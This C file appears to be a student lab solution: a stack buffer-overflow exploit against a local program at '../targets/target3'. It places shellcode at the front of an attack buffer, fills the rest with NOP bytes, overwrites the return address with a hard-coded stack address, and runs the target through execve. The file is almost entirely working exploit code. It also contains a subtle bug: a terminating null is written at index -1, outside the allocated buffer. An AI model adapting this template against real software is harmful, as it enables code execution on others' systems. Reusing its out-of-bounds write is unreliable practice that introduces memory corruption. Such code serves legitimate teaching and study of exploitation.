#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"
#define BUFF_ADDR 0x40a4fe40 // [0][4][e][f][4][a][0][4][00000000] on memory(little endian), so only need to overwrite the first 4 bytes
#define ATTACK_SIZE 81 // 88(distance from return to buffer) - 12(length of original buffer)) + 4(BUFF_ADDR) + 1

int
main ( int argc, char * argv[] )
{
    char *    args[3];
    char *    env[1];

    // Declare the attack buffer
    char *attack_buffer = (char*)malloc(ATTACK_SIZE);
    int i;
    // Overwrite the front with shellcode
    for (i = 0; i < strlen(shellcode); ++i) {
        attack_buffer[i] = shellcode[i];
    }
    // Overwrite the rest until return address by NOP
    for (; i < ATTACK_SIZE-5; ++i) {
        attack_buffer[i] = 0x90;
    }
    // Overwrite the return address
    int *ptr = (int*)(attack_buffer+i);
    *ptr = BUFF_ADDR;
    // Add NULL terminating
    attack_buffer[-1] = '\0';

    args[0] = TARGET;
    args[1] = attack_buffer;
    args[2] = NULL;
    env[0] = NULL;

    if ( execve (TARGET, args, env) < 0 )
        fprintf (stderr, "execve failed.\n");

    return (0);
}
